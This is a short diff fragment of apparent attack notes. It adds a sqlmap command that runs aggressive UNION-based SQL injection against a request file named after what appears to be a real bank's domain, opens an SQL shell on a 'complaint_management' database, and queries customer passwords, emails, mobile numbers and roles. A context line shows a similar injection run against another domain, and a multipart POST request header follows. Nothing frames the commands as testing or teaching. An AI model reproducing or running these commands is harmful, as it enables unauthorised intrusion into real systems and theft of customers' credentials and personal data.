@@ -32,6 +32,11 @@ if __name__ == "__main__":
 
 sh-3.2# python3  ../sqlmap.py -r drmertm.in.dic   --random-agent -risk 3   --technique=E  -D drmeulqx_drmertm  --sql-shell  --no-cast  --tables 
 
+python3 sqlmap.py  -r ./test/centralbankofindia.co.in.dic  --random-agent --risk 3  --technique=U  -D complaint_management -T tbl_customer  --sql-shell    --batch --no-cast
+
+
+select active,name,password,role,status,Address,email,mobile,username,gender,logincount  from  complaint_management.tbl_customer limit 10
+
 
 POST /ORH/Response HTTP/1.1
 Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
